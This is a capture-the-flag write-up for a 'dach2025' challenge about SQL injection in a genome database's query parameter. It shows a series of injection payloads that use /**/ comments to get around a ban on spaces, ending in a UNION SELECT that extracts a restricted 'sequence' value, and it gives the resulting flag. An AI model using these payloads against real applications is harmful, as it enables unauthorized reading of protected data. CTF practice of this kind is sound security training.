From the source code, it was clear that I had to exploit the `SQL injection` present within the query parameter. It seems that space was not allowed in the query parameter (I would just get a 400 Bad Request). To work around this, I used `/**/`, which is a multi-line comment in SQL, but also `%20` could be used. Then I tried to update the restricted column in the genomes table to 0, but later I noticed that the database connection was opened in read mode only. So first, I used the following payload:

```txt
1'/**/OR/**/1=1--
```
This returned restricted results, which makes sense because I retrieved every record in the table. I then tried to see only the non-restricted records in the table:

```txt
1'/**/OR/**/1=1/**/AND/**/restricted=0/**/--
```

But this returned “Too many results” thus I modified the payload to see just 1 record in this case the one with id=1:

```txt
1'/**/OR/**/1=1/**/AND/**/restricted=0/**/AND/**/id=1--
```
Good, now I was able to read the record with `id=1` and my idea was to use union to read the flag and concatenate it with the data. This was my final payload:

```txt
1'/**/OR/**/1=1/**/AND/**/restricted=0/**/AND/**/id=1/**/UNION/**/SELECT/**/1,sequence,3,4,5/**/FROM/**/genomes/**/WHERE/**/sequence/**/LIKE/**/'dach2025%'--
```

`dach2025{infosec_in_biosec_is_not_that_easy_it_seems_wt5cfv7jedfjjdbi}`
